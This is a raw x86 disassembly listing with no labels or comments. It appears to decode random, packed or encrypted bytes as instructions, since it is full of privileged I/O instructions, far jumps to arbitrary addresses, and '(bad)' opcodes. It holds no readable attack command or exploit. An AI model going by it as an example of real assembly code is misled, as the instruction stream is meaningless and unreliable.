  41fd86:	sar    DWORD PTR fs:[esi+eax*8],cl
  41fd8a:	lods   eax,DWORD PTR ds:[esi]
  41fd8b:	pop    esp
  41fd8c:	add    DWORD PTR [ebx+0x45],esp
  41fd8f:	cmp    edx,DWORD PTR [esi+ecx*8]
  41fd92:	cmp    al,0xc
  41fd94:	jne    0x41fd6d
  41fd96:	addr16 jl 0x41fd5a
  41fd99:	sub    ah,BYTE PTR [edi+0x46]
  41fd9c:	inc    edx
  41fd9d:	out    dx,eax
  41fd9e:	adc    bl,BYTE PTR [ecx+ebp*8-0x45]
  41fda2:	inc    edx
  41fda3:	jbe    0x41fda1
  41fda5:	out    0x54,eax
  41fda7:	mov    ch,0xad
  41fda9:	fbld   TBYTE PTR [ecx]
  41fdab:	jmp    0xdb2:0xb51c4067
  41fdb2:	pop    eax
  41fdb3:	shl    DWORD PTR [ebx+0x42210ff3],cl
  41fdb9:	mov    cl,0xeb
  41fdbb:	dec    ebp
  41fdbc:	jp     0x41fd85
  41fdbe:	inc    ebp
  41fdbf:	adc    cl,bh
  41fdc1:	ret    0xafaf
  41fdc4:	cwde   
  41fdc5:	mov    WORD PTR [ecx+0x1a],es
  41fdc8:	fmul   DWORD PTR [eax-0x3d]
  41fdcb:	or     eax,DWORD PTR [esp+ebp*2-0x12]
  41fdcf:	mov    dh,0xdf
  41fdd1:	int3   
  41fdd2:	out    0xd0,eax
  41fdd4:	mov    ds:0x114a4dcd,eax
  41fdd9:	out    0xbd,eax
  41fddb:	xor    al,0xf8
  41fddd:	jl     0x41fd5f
  41fddf:	mov    eax,ds:0xc5825090
  41fde4:	les    ecx,FWORD PTR [ecx-0x80]
  41fde7:	add    al,0x3
  41fde9:	xchg   ebp,eax
  41fdea:	out    0xf2,eax
  41fdec:	dec    eax
  41fded:	dec    esp
  41fdee:	out    dx,al
  41fdef:	push   0xffffffcb
  41fdf1:	sub    ah,dh
  41fdf3:	push   esp
  41fdf4:	mov    dl,0x8b
  41fdf6:	and    DWORD PTR [ebx+0x7ca45b1f],0x81f3d804
  41fe00:	adc    eax,0x8dd7799c
  41fe05:	std    
  41fe06:	ss je  0x41fdc4
  41fe09:	stc    
  41fe0a:	dec    ecx
  41fe0b:	popf   
  41fe0c:	lea    ebx,[edx+0x7e]
  41fe0f:	test   BYTE PTR fs:[eax-0x2],ch
  41fe13:	jae    0x41fe8e
  41fe15:	adc    cl,BYTE PTR [esi-0x56]
  41fe18:	popa   
  41fe19:	bound  eax,QWORD PTR [ecx-0x79db5859]
  41fe1f:	and    ecx,DWORD PTR [eax+eiz*1]
  41fe22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe23:	in     al,0x57
  41fe25:	mov    al,ds:0xcfdfc911
  41fe2a:	mov    al,0x6d
  41fe2c:	popf   
  41fe2d:	add    ah,dl
  41fe2f:	push   ss
  41fe30:	pop    eax
  41fe31:	or     eax,0xdcc43ec9
  41fe36:	pop    edx
  41fe37:	xchg   ecx,eax
  41fe38:	sub    dh,ch
  41fe3a:	mov    bl,0x25
  41fe3c:	or     al,BYTE PTR [edi]
  41fe3e:	cs push ds
  41fe40:	in     eax,0x70
  41fe42:	hlt    
  41fe43:	add    dl,ch
  41fe45:	mov    ds:0xee403e8f,al
  41fe4a:	(bad)  
  41fe4b:	jg     0x41fe35
  41fe4d:	ret    
  41fe4e:	call   0xb048:0xcb658f6d
  41fe55:	adc    eax,0x3d7cdad1
  41fe5a:	mov    bl,0x76
  41fe5c:	jbe    0x41feb1
  41fe5e:	js     0x41fe80
  41fe60:	mov    esi,0x597e8303
  41fe65:	in     al,0xe1
  41fe67:	out    dx,eax
  41fe68:	jle    0x41fe69
  41fe6a:	pop    ecx
  41fe6b:	data16 (bad) 
  41fe6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe6e:	push   edx
  41fe6f:	lods   al,BYTE PTR ds:[esi]
  41fe70:	dec    edx
  41fe71:	mov    bl,0x6
  41fe73:	cwde   
  41fe74:	pop    edx
  41fe75:	je     0x41fe2a
  41fe77:	inc    ebp
  41fe78:	test   al,0xf8
  41fe7a:	and    bh,BYTE PTR [ebx+0x11250862]
  41fe80:	in     eax,dx
  41fe81:	pusha  
  41fe82:	and    bl,BYTE PTR [ebx]
  41fe84:	bound  edi,QWORD PTR [ecx-0x6]
  41fe87:	imul   edi,DWORD PTR [esi],0x44857ca1
  41fe8d:	inc    edi
  41fe8e:	pop    ecx
  41fe8f:	call   0x3981:0x3ad0a36
  41fe96:	dec    ecx
  41fe97:	push   edx
  41fe98:	mov    ds:0x29938ed0,eax
  41fe9d:	outs   dx,DWORD PTR ds:[esi]
  41fe9e:	jecxz  0x41fe68
  41fea0:	xor    al,0xad
  41fea2:	out    0x1e,al
  41fea4:	mov    bh,0xb2
  41fea6:	(bad)  
  41fea8:	lahf   
  41fea9:	mov    fs,WORD PTR [edx+ebx*1+0x40b7f524]
  41feb0:	mov    edx,0xbd585a0c
  41feb5:	sbb    DWORD PTR [edi],edx
  41feb7:	(bad)  
  41feb8:	rol    DWORD PTR [eax-0x3f],1
  41febb:	loopne 0x41fef0
  41febd:	in     al,dx
  41febe:	pop    eax
  41febf:	mov    DWORD PTR [edi+0x7f],ebx
  41fec2:	jge    0x41fe63
  41fec4:	shr    BYTE PTR [eax],0x95
  41fec7:	dec    ebx
  41fec8:	les    edi,FWORD PTR [edi+0x62]
  41fecb:	mov    DWORD PTR [eax],ebp
  41fecd:	aas    
  41fece:	mov    ebx,0x299d4f7b
  41fed3:	add    ah,BYTE PTR [ebx-0x6b]
  41fed6:	mov    ah,0x99
  41fed8:	scas   al,BYTE PTR es:[edi]
  41fed9:	fwait
  41feda:	and    ebp,DWORD PTR [ebp+0x626bc658]
  41fee0:	loope  0x41fe62
  41fee2:	pop    ecx
  41fee3:	mov    BYTE PTR cs:[esi-0x23],0xa9
  41fee8:	mov    ah,BYTE PTR [ecx]
  41feea:	in     al,0xde
  41feec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41feed:	fadd   st(4),st
  41feef:	call   0x2de1e4e1
  41fef4:	jbe    0x41febe
  41fef6:	test   DWORD PTR [ebp-0x626195af],edx
  41fefc:	or     BYTE PTR [ecx+ecx*4+0x0],dl
  41ff00:	dec    ebp
  41ff01:	daa    
  41ff02:	pop    ss
  41ff03:	ret    0x41a8
  41ff06:	add    eax,0x1bbdd480
  41ff0b:	nop
  41ff0c:	mov    DWORD PTR [edi+0x23],0x6614e47d
  41ff13:	sbb    BYTE PTR [ebp+0x16],dl
  41ff16:	fnsave [esi+0x72]
  41ff19:	pop    ebx
  41ff1a:	jmp    0x41ff33
  41ff1c:	cli    
  41ff1d:	jbe    0x41fed4
  41ff1f:	lahf   
  41ff20:	out    0x4d,al
  41ff22:	je     0x41ff54
  41ff24:	xchg   ebx,eax
  41ff25:	jo     0x41ff0b
  41ff27:	enter  0x26c5,0x2d
  41ff2b:	popf   
  41ff2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff2d:	adc    eax,DWORD PTR [eax-0x187ebf26]
  41ff33:	fs mov ebp,0x2ef454cc
  41ff39:	outs   dx,BYTE PTR ds:[esi]
  41ff3a:	inc    edx
  41ff3b:	xchg   edx,eax
  41ff3c:	xor    dh,dh
  41ff3e:	cld    
  41ff3f:	fwait
  41ff40:	push   0x5c
  41ff42:	mov    ds:0x4f9f2a92,eax
  41ff47:	rol    BYTE PTR [edx+0x58],cl
  41ff4a:	push   ss
  41ff4b:	jae    0x41ff76
  41ff4d:	les    esp,FWORD PTR [edi-0x27f57b62]
  41ff53:	push   edx
  41ff54:	fwait
  41ff55:	mov    esp,0xd71ed256
  41ff5a:	add    al,0x79
  41ff5c:	ror    DWORD PTR [ebp-0x3b],cl
  41ff5f:	xlat   BYTE PTR ds:[ebx]
  41ff60:	inc    esp
  41ff61:	sbb    DWORD PTR [ecx],eax
  41ff63:	sbb    eax,DWORD PTR es:[eax-0x41]
  41ff67:	cdq    
  41ff68:	fdiv   QWORD PTR [edi+ebp*1-0x3a678346]
  41ff6f:	add    BYTE PTR [ebx-0x15],ch
  41ff72:	arpl   WORD PTR [eax+0x9037d61],sp
  41ff78:	push   cs
  41ff79:	add    bl,BYTE PTR [edi]
  41ff7b:	cmp    dl,dl
  41ff7d:	es ret 
  41ff7f:	jge    0x41ff0d
  41ff81:	mov    al,ds:0x50a88c85
  41ff86:	imul   esi,DWORD PTR [edi-0x44],0x70
  41ff8a:	push   edi
  41ff8b:	mov    esp,0x28043fe8
  41ff90:	stos   BYTE PTR es:[edi],al
  41ff91:	fs gs or eax,0x516a5d02
  41ff98:	in     eax,dx
  41ff99:	sbb    al,BYTE PTR [ebx+ebx*8]
  41ff9c:	out    0x3b,eax
  41ff9e:	inc    esp
  41ff9f:	mov    edx,0x79bbc3f4
  41ffa4:	aam    0x87
  41ffa6:	inc    ecx
  41ffa7:	cmp    DWORD PTR ds:0x4eed8471,edx
  41ffad:	jmp    0xae0281d8
  41ffb2:	xchg   edi,eax
  41ffb3:	or     ebx,ebx
  41ffb5:	jmp    0xff08:0xc9ce6e8d
  41ffbc:	inc    ebp
  41ffbd:	js     0x420002
  41ffbf:	inc    ebp
  41ffc0:	scas   al,BYTE PTR es:[edi]
  41ffc1:	loopne 0x41ffcd
  41ffc3:	jmp    0x420001
  41ffc5:	sbb    al,0x88
  41ffc7:	mov    al,ds:0x6b5b6d1d
  41ffcc:	mov    cl,0x91
  41ffce:	ins    BYTE PTR es:[edi],dx
  41ffcf:	leave  
  41ffd0:	imul   eax,eax,0x43
  41ffd3:	sub    DWORD PTR [ebx-0x6a],eax
  41ffd6:	adc    cl,0xe7
  41ffd9:	jmp    0x420029
  41ffdb:	out    dx,eax
  41ffdc:	pop    ebx
  41ffdd:	mov    ebp,0x2d4ee137
  41ffe2:	in     eax,0xd9
  41ffe4:	cmc    
  41ffe5:	mov    esi,0xe6c8393e
  41ffea:	pop    ecx
  41ffeb:	jns    0x41ff70
  41ffed:	repnz rcl DWORD PTR [ebx-0x25],cl
  41fff1:	ja     0x41ffe2
  41fff3:	fistp  DWORD PTR [ebx]
  41fff5:	push   0xc2df05f1
  41fffa:	(bad)  
  41fffc:	pop    esp
  41fffd:	jnp    0x42000a
  41ffff:	jmp    0xf6b7:0x8ee7d67d
  420006:	sbb    eax,0xb2c3ffaa
  42000b:	test   DWORD PTR [edx-0x10],0x53f6bdf2
  420012:	ficom  DWORD PTR [edi+0x4c]
  420015:	inc    ebp
  420016:	jbe    0x420060
  420018:	add    BYTE PTR ds:0x981b372e,0x4a
  42001f:	mov    ss,ebx
  420021:	out    0xf1,eax
  420023:	clc    
  420024:	rol    DWORD PTR [esi+esi*2-0x3fdad6f3],cl
  42002b:	sub    BYTE PTR [ebp-0x2015c621],dh
  420031:	(bad)  
  420032:	cmp    DWORD PTR [esi+0x57],edi
  420035:	mov    ecx,ebx
  420037:	out    dx,eax
  420038:	cmp    DWORD PTR [eax-0x45],esp
  42003b:	lahf   
  42003c:	cs push ds
  42003e:	sbb    al,0xc0
  420040:	pop    ecx
  420041:	pop    edi
  420042:	and    al,BYTE PTR [ebx+0x68]
  420045:	jle    0x41fff5
  420047:	inc    edx
  420048:	push   edi
  420049:	sahf   
  42004a:	ret    
  42004b:	jp     0x42005d
  42004d:	std    
  42004e:	dec    ebp
  42004f:	and    edi,DWORD PTR [edx+0x2a]
  420052:	cs mov bl,0x91
  420055:	dec    edx
  420056:	pop    ecx
  420057:	dec    BYTE PTR [ebp+eiz*2-0x45478b15]
  42005e:	loope  0x420028
  420060:	push   edi
  420061:	aaa    
  420062:	sub    DWORD PTR [esi-0x52],0x2c7956cb
  420069:	dec    esi
  42006a:	sub    BYTE PTR [edx+0x2d],bl
  42006d:	and    eax,0xf38238f5
  420072:	jmp    0x9e07:0x1ab2e6ad
  420079:	fisttp WORD PTR [edi]
  42007b:	jo     0x42003d
  42007d:	push   ss
  42007e:	xchg   ebx,eax
  42007f:	cwde   
  420080:	retf   0x8689
  420083:	sub    edx,ebp
  420085:	and    al,0x75
  420087:	sahf   
  420088:	clc    
  420089:	xchg   ebx,eax
  42008a:	(bad)  
  42008b:	scas   al,BYTE PTR es:[edi]
  42008c:	sbb    cl,BYTE PTR [esi]
  42008e:	jo     0x4200bd
  420090:	jp     0x420070
  420092:	ss mov al,0xe0
  420095:	arpl   WORD PTR [ebp+0x30],sp
  420098:	lods   al,BYTE PTR ds:[esi]
  420099:	cwde   
  42009a:	and    eax,0x59f1eb53
  42009f:	xor    BYTE PTR [eax+edi*8],cl
  4200a2:	je     0x420111
  4200a4:	pop    esp
  4200a5:	and    BYTE PTR [ebp+0xf8fdb5d],cl
  4200ab:	pop    esp
  4200ac:	mov    al,fs:0xfe2eccd0
  4200b2:	shl    DWORD PTR [ebx-0x7b604089],cl
  4200b8:	enter  0x36d6,0xc3
  4200bc:	adc    al,0x23
  4200be:	jne    0x4200c9
  4200c0:	bound  eax,QWORD PTR [esi+0x52]
  4200c3:	icebp  
  4200c4:	sub    DWORD PTR [ecx+0x7d650f28],ebp
  4200ca:	xchg   ecx,eax
  4200cb:	cmp    esp,DWORD PTR [eax+esi*1-0x44]
  4200cf:	push   ss
  4200d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200d1:	cmp    ah,BYTE PTR [eax]
  4200d3:	fs iret 
  4200d5:	add    DWORD PTR [ebp+0x27ccb7a2],edx
  4200db:	sub    ebx,ebx
  4200dd:	and    eax,0x282ffb9e
  4200e2:	mov    WORD PTR [esi+0x297e65be],ds
  4200e8:	mov    bl,BYTE PTR [edi+0x1]
  4200eb:	mov    eax,0xaffd0833
  4200f0:	add    al,0xcb
  4200f2:	(bad)  
  4200f3:	daa    
  4200f4:	add    DWORD PTR [ebx+0x6a],ebp
  4200f7:	imul   ebp,edi,0xc9ea4452
  4200fd:	inc    esi
  4200fe:	push   esi
  4200ff:	add    eax,0x2a40fa94
  420104:	mov    ch,0xd3
  420106:	pop    edx
  420107:	enter  0x27ce,0x47
  42010b:	cmp    eax,0x5d087f7c
  420110:	das    
  420111:	jae    0x420155
  420113:	jmp    0x4200de
  420115:	fld    DWORD PTR [eax+0x34b02358]
  42011b:	push   ecx
  42011c:	cs dec edx
  42011e:	xchg   edx,eax
  42011f:	je     0x42018e
  420121:	rol    BYTE PTR [edi+0x7f],1
  420124:	test   BYTE PTR [eax],bl
  420126:	inc    esi
  420127:	imul   ecx,DWORD PTR [ebp+0x46],0xf8673008
  42012e:	or     DWORD PTR [ebx+0x2c],esp
  420131:	clc    
  420132:	add    eax,0xdb403676
  420137:	(bad)  
  420138:	xchg   esi,eax
  420139:	or     DWORD PTR [ecx+0x60165ff2],ecx
  42013f:	test   al,0x92
  420141:	call   0xea38:0x3cd2d608
  420148:	mov    ds:0x75f3cc8c,eax
  42014d:	nop
  42014e:	clc    
  42014f:	or     edx,0x894f8278
  420155:	sub    cl,dh
  420157:	popf   
  420158:	jnp    0x4201d2
  42015a:	cmp    bl,cl
  42015c:	out    0x54,eax
  42015e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42015f:	add    al,0xd0
  420161:	in     eax,dx
  420162:	dec    ebx
  420163:	rdmsr  
  420165:	xor    bh,BYTE PTR [ebx+ebx*2]
  420168:	mov    ds:0xd2cb80b3,eax
  42016d:	cs into 
  42016f:	or     DWORD PTR [eax+0x2f],edx
  420172:	imul   esi
  420174:	(bad)  
  420175:	les    edi,FWORD PTR [ebp-0x4d]
  420178:	dec    esp
  420179:	mov    dl,0xb
  42017b:	jnp    0x42014c
  42017d:	adc    BYTE PTR [ebp+eiz*2+0x2a41a9d5],bl
  420184:	std    
  420185:	ja     0x4201a2
  420187:	xchg   ecx,ebx
  420189:	mov    ds:0xe7c108fd,al
  42018e:	fbld   TBYTE PTR [ebx]
  420190:	xchg   ebx,eax
  420191:	test   eax,0x639d3814
  420196:	in     al,dx
  420197:	(bad)  
  420198:	cs push ss
  42019a:	dec    edx
  42019b:	xchg   ebp,esp
  42019d:	adc    ecx,DWORD PTR [esi+0x3]
  4201a0:	adc    BYTE PTR [ebp-0x634e4843],al
  4201a6:	ret    
  4201a7:	pop    edx
  4201a8:	push   edx
  4201a9:	sar    DWORD PTR [edx-0x7a],cl
  4201ac:	dec    ebp
  4201ad:	pushf  
  4201ae:	loope  0x420150
  4201b0:	jg     0x420155
  4201b2:	xchg   BYTE PTR [edi-0x46282511],cl
  4201b8:	aas    
  4201b9:	pop    ecx
  4201ba:	and    eax,0x10d339a1
  4201bf:	inc    DWORD PTR [esi-0x1664b084]
  4201c5:	pop    esp
  4201c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201c7:	dec    ebp
  4201c8:	call   0x8eeb767b
  4201cd:	pop    ds
  4201ce:	and    eax,0x12ffe7c5
  4201d3:	outs   dx,DWORD PTR ds:[esi]
  4201d4:	retf   
  4201d5:	in     eax,dx
  4201d6:	xlat   BYTE PTR ds:[ebx]
  4201d7:	cmp    al,0x37
  4201d9:	pop    ebp
  4201da:	or     edx,DWORD PTR [eax]
  4201dc:	pop    eax
  4201dd:	retf   
  4201de:	pop    ecx
  4201df:	test   eax,0x2f5b9c1a
  4201e4:	inc    edx
  4201e5:	pop    esp
  4201e6:	inc    esi
  4201e7:	call   0xf6419386
  4201ec:	xor    eax,0x55949a4f
  4201f1:	lods   eax,DWORD PTR ds:[esi]
  4201f2:	pop    eax
  4201f3:	sbb    edi,DWORD PTR [ebx+ebx*2]
  4201f6:	add    bl,dh
  4201f8:	fsub   st,st(7)
  4201fa:	fidiv  WORD PTR [edx-0x234da2e8]
  420200:	mov    DWORD PTR ds:0x8ed3f2a6,edx
  420206:	out    0x1b,eax
  420208:	inc    esi
  420209:	xchg   edx,eax
  42020a:	mov    bh,0x5b
  42020c:	mov    cs,WORD PTR [ecx+ecx*8+0x5d26cd14]
  420213:	and    BYTE PTR [eax+0x2760fa57],ch
  420219:	mov    esi,0x9471b431
  42021e:	mov    ecx,0x71689517
  420223:	cwde   
  420224:	jge    0x420274
  420226:	adc    edx,DWORD PTR [edx+0x4e]
  420229:	cld    
  42022a:	aad    0xcb
  42022c:	and    al,0x19
  42022e:	and    DWORD PTR [esi],ebp
  420230:	pop    ebp
  420231:	pop    ecx
  420232:	std    
  420233:	js     0x4201fe
  420235:	jp     0x4201eb
  420237:	inc    ecx
  420238:	fwait
  420239:	xor    cl,cl
  42023b:	in     al,0x37
  42023d:	ror    DWORD PTR [ebp-0x6644b63c],1
  420243:	sti    
  420244:	inc    edi
  420245:	fmulp  st(7),st
  420247:	add    BYTE PTR [edi],cl
  420249:	mov    edx,0xacaa6656
  42024e:	cmc    
  42024f:	ret    0x28cf
  420252:	jg     0x4202a7
  420254:	stos   DWORD PTR es:[edi],eax
  420255:	jecxz  0x4202c9
  420257:	mov    ebx,ecx
  420259:	mov    eax,DWORD PTR [eax]
  42025b:	add    ch,BYTE PTR [eax]
  42025d:	and    esp,eax
  42025f:	push   ebx
  420260:	shl    BYTE PTR [esi],cl
  420262:	loope  0x42027d
  420264:	mov    edi,0x184483fc
  420269:	test   al,dh
  42026b:	outs   dx,DWORD PTR ds:[esi]
  42026c:	(bad)  
  42026d:	push   ss
  42026e:	jle    0x420275
  420270:	jbe    0x420210
  420272:	xor    esp,DWORD PTR ds:0x684784b2
  420278:	jg     0x42027c
  42027a:	dec    ebp
  42027b:	jbe    0x420295
  42027d:	add    dl,ch
  42027f:	js     0x4202f0
  420281:	shl    DWORD PTR [edx+ecx*1+0x774d9b19],0x3c
  420289:	lds    ebp,FWORD PTR [esi-0x60]
  42028c:	xchg   ebp,eax
  42028d:	cld    
  42028e:	xor    DWORD PTR [edi],ebp
  420290:	pushf  
  420291:	pusha  
  420292:	xor    DWORD PTR [ecx],edx
  420294:	jae    0x4202c8
  420296:	push   cs
  420297:	popf   
  420298:	mov    edx,ebx
  42029a:	cmc    
  42029b:	push   ebx
  42029c:	jp     0x4202b2
  42029e:	inc    ebp
  42029f:	xor    edi,DWORD PTR [esp+esi*1+0x5a]
  4202a3:	fcmovu st,st(4)
  4202a5:	mov    eax,ds:0x6d7d331
  4202aa:	ins    DWORD PTR es:[edi],dx
  4202ab:	and    ah,bh
  4202ad:	ja     0x42031a
  4202af:	pop    ebx
  4202b0:	jbe    0x42032b
  4202b2:	in     al,dx
  4202b3:	inc    edx
  4202b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202b5:	mov    eax,0x36bcd034
  4202ba:	repz xor ch,BYTE PTR [ecx-0x60]
  4202be:	pushf  
  4202bf:	lds    ecx,FWORD PTR [ebp-0x66]
  4202c2:	scas   eax,DWORD PTR es:[edi]
  4202c3:	je     0x420303
  4202c5:	dec    ebp
  4202c6:	loopne 0x420315
  4202c8:	enter  0x1ec,0x67
  4202cc:	mov    ah,0x47
  4202ce:	xor    al,0xb
  4202d0:	out    0x60,al
  4202d2:	es sar cl,1
  4202d5:	xchg   esp,eax
  4202d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202d7:	and    al,0x54
  4202d9:	and    ah,BYTE PTR [ebx]
  4202db:	popf   
  4202dc:	pcmpgtw mm0,QWORD PTR [ecx+0x5e]
  4202e0:	enter  0x4955,0xd4
  4202e4:	imul   esp,DWORD PTR [esi],0x3816b3e4
  4202ea:	jl     0x420316
  4202ec:	mov    ds:0xaea1000e,al
  4202f1:	(bad)  
  4202f2:	sahf   
  4202f3:	jg     0x420368
  4202f5:	dec    edx
  4202f6:	pop    esp
  4202f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202f8:	dec    ebp
  4202f9:	test   DWORD PTR [ecx-0x1f],ebp
  4202fc:	jo     0x42033e
  4202fe:	and    eax,0x5873957f
  420303:	jno    0x42034a
  420305:	or     al,0xa3
  420307:	call   0x28eb:0xc0548317
  42030e:	jbe    0x4202d0
  420310:	xchg   BYTE PTR [eax],ch
  420312:	sbb    esi,DWORD PTR [ebp+0x26]
  420315:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420316:	mov    esi,0xd278b417
  42031b:	jecxz  0x420386
  42031d:	inc    ebx
  42031e:	sub    esp,0xfffffff2
  420321:	les    edi,FWORD PTR [ebx+eax*2-0x3e9954f2]
  420328:	mov    ebp,0x53b3004f
  42032d:	jb     0x42032f
  42032f:	pop    ss
  420330:	and    al,0x73
  420332:	icebp  
  420333:	pusha  
  420334:	cmp    edx,DWORD PTR [ebx+0x7d]
  420337:	ins    BYTE PTR es:[edi],dx
  420338:	rol    BYTE PTR [ecx-0x1a],1
  42033b:	xlat   BYTE PTR ds:[ebx]
  42033c:	(bad)  [ebx]
  42033e:	call   0x130cbebe
  420343:	and    WORD PTR [ecx-0x1c],0x1cf1
  420349:	sbb    ecx,DWORD PTR [eax+0x60dd47bd]
  42034f:	(bad)
  420352:	ss repnz inc esp
  420355:	leave  
  420356:	ret    
  420357:	vmread ebx,ebx
  42035a:	sbb    ecx,ebp
  42035c:	push   esi
  42035d:	(bad)  
  42035e:	mov    ds:0xfd912a1d,eax
  420363:	call   0x932:0x95efae81
  42036a:	push   cs
  42036b:	xchg   dh,cl
  42036d:	and    eax,0x3d9d56af
  420372:	aas    
  420373:	loopne 0x42032a
  420375:	aam    0x5e
  420377:	ror    BYTE PTR [ebp+0x32],cl
  42037a:	xor    eax,0x23abecfa
  42037f:	cli    
  420380:	pop    esp
  420381:	or     eax,0x47cf09e3
  420386:	sahf   
  420387:	and    BYTE PTR [eax+0x6ab4e8d3],dl
  42038d:	cmp    ecx,esi
  42038f:	(bad)  
  420390:	or     ebx,esi
  420392:	ficom  DWORD PTR [ecx]
  420394:	sbb    BYTE PTR [ebp-0x683d823e],cl
  42039a:	mov    ch,0x61
  42039c:	rol    DWORD PTR [ebx+0x63],0x40
  4203a0:	test   DWORD PTR [edi+0x1f992645],esi
  4203a6:	xchg   DWORD PTR [eax],edi
  4203a8:	inc    ecx
  4203a9:	mov    esi,0x6d2d0bb8
  4203ae:	jne    0x420362
  4203b0:	or     ch,BYTE PTR [eax+0x356728ff]
  4203b6:	push   esp
  4203b7:	mov    ch,0xd3
  4203b9:	mov    al,0x37
  4203bb:	dec    edx
  4203bc:	dec    eax
  4203bd:	pushf  
  4203be:	inc    esi
  4203bf:	sub    BYTE PTR [ebx+0x6e],bl
  4203c2:	mov    al,BYTE PTR [edi+esi*8+0x21c81d97]
  4203c9:	scas   al,BYTE PTR es:[edi]
  4203ca:	scas   eax,DWORD PTR es:[edi]
  4203cb:	push   0x5c
  4203cd:	sub    al,0x57
  4203cf:	xor    dl,BYTE PTR [ecx+0x63a81c76]
  4203d5:	ds jno 0x42037a
  4203d8:	xchg   esi,eax
  4203d9:	inc    esi
  4203da:	or     eax,0x6a3e3fc0
  4203df:	add    edi,DWORD PTR [edi+0x3279538]
  4203e5:	(bad)  
  4203e6:	fiadd  DWORD PTR [ebx+0x4c]
  4203e9:	sbb    eax,ebp
  4203eb:	mov    bh,0x40
  4203ed:	dec    ecx
  4203ee:	push   eax
  4203ef:	outs   dx,BYTE PTR ds:[esi]
  4203f0:	xor    esi,0xcda02ce5
  4203f6:	sub    DWORD PTR [edi-0x12],edx
  4203f9:	mov    ecx,0xa103056
  4203fe:	pushf  
  4203ff:	pop    ecx
  420400:	add    al,0x8d
  420402:	fdivr  st(5),st
  420404:	ret    
  420405:	stos   BYTE PTR es:[edi],al
  420406:	jnp    0x42040c
  420408:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  42040a:	mov    eax,0xf0015550
  42040f:	enter  0x51bf,0x65
  420413:	(bad)  
  420414:	push   ebp
  420415:	mov    edx,0xc43371d8
  42041a:	push   0x1e
  42041c:	out    0x16,eax
  42041e:	mov    BYTE PTR [edx+0x125d733e],bh
  420424:	std    
  420425:	push   esp
  420426:	loop   0x4203de
  420428:	mov    ebp,0x4dd6a57f
  42042d:	lea    ebx,gs:[esp+ecx*8]
  420431:	push   0xffffffa3
  420433:	push   ebx
  420434:	mov    ch,0xdb
  420436:	inc    edi
  420437:	cmp    esi,eax
  420439:	out    0x91,al
  42043b:	xchg   esp,eax
  42043c:	jmp    0x57cdcba5
  420441:	fsubr  DWORD PTR [esi+0x6e3613a]
  420447:	mov    esi,DWORD PTR [esi]
  420449:	xchg   ecx,eax
  42044a:	inc    edx
  42044b:	jecxz  0x420448
  42044d:	test   DWORD PTR [ebx+edi*2-0x291a52e9],ebp
  420454:	pop    edx
  420455:	adc    DWORD PTR [esi+0x21],esi
  420458:	(bad)  
  420459:	cli    
  42045a:	lods   eax,DWORD PTR ds:[esi]
  42045b:	xor    ebp,DWORD PTR [edi-0x6fe6c1bd]
  420461:	pop    ebp
  420462:	loope  0x4204b3
  420464:	repz add DWORD PTR [eax+0x69],ebp
  420468:	adc    al,0x37
  42046a:	adc    ah,ch
  42046c:	dec    esp
  42046d:	dec    esp
  42046e:	xchg   ah,bh
  420470:	nop
  420471:	cli    
  420472:	popf   
  420473:	outs   dx,BYTE PTR ds:[esi]
  420474:	aad    0xca
  420476:	pushf  
  420477:	ret    
  420478:	jg     0x420412
  42047a:	jns    0x4204e5
  42047c:	sub    BYTE PTR [ebp+0x3d],bh
  42047f:	mov    DWORD PTR [eax+0x60c67a2c],0x8c94c73b
  420489:	push   ebp
  42048a:	scas   al,BYTE PTR es:[edi]
  42048b:	inc    edi
  42048c:	dec    esi
  42048d:	push   esp
  42048e:	xchg   ebx,eax
  42048f:	jb     0x420503
  420491:	xchg   edi,eax
  420492:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420493:	mov    al,ds:0x1d2893c0
  420498:	mov    ch,BYTE PTR [esi+0x12aac5b7]
  42049e:	test   eax,0xca6ea2d2
  4204a3:	cmp    eax,DWORD PTR [esi-0x59]
  4204a6:	leave  
  4204a7:	sbb    al,0x3c
  4204a9:	push   ebx
  4204aa:	sub    cl,al
  4204ac:	es mov ebp,0x4d6d2dba
  4204b2:	lahf   
  4204b3:	sbb    al,0x56
  4204b5:	(bad)  
  4204b6:	adc    dl,dh
  4204b8:	outs   dx,DWORD PTR ds:[esi]
  4204b9:	push   0x4e036be6
  4204be:	stos   DWORD PTR es:[edi],eax
  4204bf:	pcmpgtw mm6,QWORD PTR [ecx+0x28]
  4204c3:	(bad)  
  4204c4:	or     cl,cl
  4204c6:	xchg   edi,eax
  4204c7:	cmovne ebp,esp
  4204ca:	int    0xc6
  4204cc:	std    
  4204cd:	(bad)  
  4204ce:	push   ecx
  4204cf:	repnz lahf 
  4204d1:	icebp  
  4204d2:	sysexit 
  4204d4:	dec    esp
  4204d5:	and    eax,0x35c4459a
  4204da:	jno    0x4204ae
  4204dc:	add    bh,BYTE PTR [edi+eiz*4-0x7a7154f9]
  4204e3:	mov    DWORD PTR [edi+0x6991ffea],esi
  4204e9:	pop    ds
  4204ea:	dec    edi
  4204eb:	repz or DWORD PTR [eax],0x1a
  4204ef:	mov    bh,0x88
  4204f1:	push   ebx
  4204f2:	mov    eax,ds:0x260c93e
  4204f7:	mov    edx,0xd4275f81
  4204fc:	adc    BYTE PTR [ecx],bh
  4204fe:	push   edi
  4204ff:	icebp  
  420500:	cmp    al,0x38
  420502:	stc    
  420503:	jne    0x4204b1
  420505:	hlt    
  420506:	imul   ecx,DWORD PTR [ecx],0xffffffb8
  420509:	push   ebp
  42050a:	(bad)  
  42050b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42050c:	hlt    
  42050d:	call   0xbf7d:0xeb006251
  420514:	ret    0xacc5
  420517:	repz in al,dx
  420519:	outs   dx,DWORD PTR ds:[esi]
